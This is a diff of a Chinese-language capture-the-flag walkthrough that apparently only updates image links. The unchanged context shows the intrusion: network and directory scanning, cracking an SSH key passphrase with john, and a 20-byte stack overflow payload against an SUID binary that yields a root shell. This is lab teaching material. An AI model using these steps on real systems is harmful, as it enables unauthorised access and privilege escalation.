@@ -4,14 +4,14 @@
 ```bash
 arp-scan -l
 ```
-![[Pasted image 20251223153342.png]]
+![](images/Pasted%20image%2020251223153342.png)
 ## 2.nmap扫描
 
 ```bash
 sudo nmap -T4 -sS -sV -sC -O 192.168.3.3
 ```
 
-![[Pasted image 20251223153700.png]]
+![](images/Pasted%20image%2020251223153700.png)
 其中有用的部分
 ```bash
 31337/tcp open  http   
@@ -19,7 +19,7 @@ sudo nmap -T4 -sS -sV -sC -O 192.168.3.3
 ```
 
 ## 3.dirb扫描
-![[Pasted image 20251223160207.png]]
+![](images/Pasted%20image%2020251223160207.png)
 ```bash
 ---- Scanning URL: http://192.168.43.76:31337/ ----
 + http://192.168.43.76:31337/.bash_history (CODE:200|SIZE:853)              
@@ -34,7 +34,7 @@ sudo nmap -T4 -sS -sV -sC -O 192.168.3.3
 ```bash
 curl 192.168.43.76:31337/taxes/
 ```
-![[Pasted image 20251223162724.png]]
+![](images/Pasted%20image%2020251223162724.png)
 ### ==**flag1**==
 ```
 flag1{make_america_great_again}
@@ -50,14 +50,14 @@ mac本地生成ssh密钥对，命名**`my_kali_rsa`**
 ```bash
 ssh-keygen -t rsa -f ~/.ssh/my_kali_rsa
 ```
-![[Pasted image 20251223101602.png]]
+![](images/Pasted%20image%2020251223101602.png)
 ### 5.2 本地开启服务
 开启mac本地80端口下载服务, 注意路径问题，需要在**.ssh** 文件目录下开启
 
 ```
 python3 -m http.server 80
 ```
-![[Pasted image 20251223103422.png]]
+![](images/Pasted%20image%2020251223103422.png)
 
 ### 5.3 上传本地公钥至kali
 ```
@@ -66,7 +66,7 @@ cat ~/.ssh/authorized_keys
 cat my_kali_rsa.pub
 cat my_kali_rsa.pub >> ~/.ssh/authorized_keys
 ```
-![[Pasted image 20251223103139.png]]
+![](images/Pasted%20image%2020251223103139.png)
 
 ### 5.4 ssh远程kali
 mac本地进行ssh远程kali, 注意这里** -i ** 是==私钥==
@@ -74,7 +74,7 @@ mac本地进行ssh远程kali, 注意这里** -i ** 是==私钥==
 ssh -i .ssh/my_kali_rsa root@192.168.43.62
 ```
 
-![[Pasted image 20251223111029.png]]
+![](images/Pasted%20image%2020251223111029.png)
 
 - **==实际登录验证阶段（SSH 连接时的自动流程）==**
 
@@ -88,11 +88,11 @@ ssh -i .ssh/my_kali_rsa root@192.168.43.62
     - 不一致：拒绝登录。
 
 - **生成私钥和公钥**
-![[Pasted image 20251223120939.png]]
+![](images/Pasted%20image%2020251223120939.png)
 
-![[Pasted image 20251223130917.png]]
+![](images/Pasted%20image%2020251223130917.png)
 
-![[Pasted image 20251223125520.png]]
+![](images/Pasted%20image%2020251223125520.png)
 
 ## 6.ssh登录
 ### 6.1 id_rsa登录
@@ -120,7 +120,7 @@ simon@192.168.43.76: Permission denied (publickey).
 3. 进行转换
 4. 破解
 5. 查看密码
-![[Pasted image 20251223145306.png]]
+![](images/Pasted%20image%2020251223145306.png)
 
 
 ```
@@ -163,9 +163,9 @@ john --show ssh_key_hash.txt
 ```
 ### 6.3 破解成功登录
 破解查看密码，为 **`starwars`**,再次尝试登录
-![[Pasted image 20251223145454.png]]
+![](images/Pasted%20image%2020251223145454.png)
 发现登录成功
-![[Pasted image 20251223150511.png]]
+![](images/Pasted%20image%2020251223150511.png)
 
 
 ## 7.查找flag
@@ -179,22 +179,22 @@ find / \( -name user.txt -o -name root.txt \) 2>/dev/null -exec cat {} +
 ```
 flag2{use_the_source_luke}
 ```
-![[Pasted image 20251223151206.png]]
+![](images/Pasted%20image%2020251223151206.png)
 查看read_message.c完整代码
-![[Pasted image 20251223152106.png]]
+![](images/Pasted%20image%2020251223152106.png)
 ### 堆栈溢出
 > [!Summary]
 > 分析上述源码。当我们输入一个字符串时, 它将与Simon 一起检查字符串的前`5`字符。如果匹配, 它将运行一个程序`/usr/local/bin/read_message`。现在输入它被分配大小为`20`个字节。因此, 我们溢出堆栈进入超过`20`个字节的数据。我们使用前`5`个字符是 `"Simon"`, 然后是`15` 个任意字符, 然后是 `"/bin/sh" `在第`21`字节，溢出提权。
 
 
 查找`root`权限的文件，发现`read_message`也是`root`权限
-![[Pasted image 20251223152424.png]]
+![](images/Pasted%20image%2020251223152424.png)
 运行`read_message`在输入用户名后随意加**15**字节**（5+15=20）**的内容，再加`/bin/sh`调用`sh`命 令解释器 ，获取`root`权限。
 
 ```
 Simon123451234512345/bin/sh
 ```
-![[Pasted image 20251223152923.png]]
+![](images/Pasted%20image%2020251223152923.png)
 
 ### ==flag3==
 ```
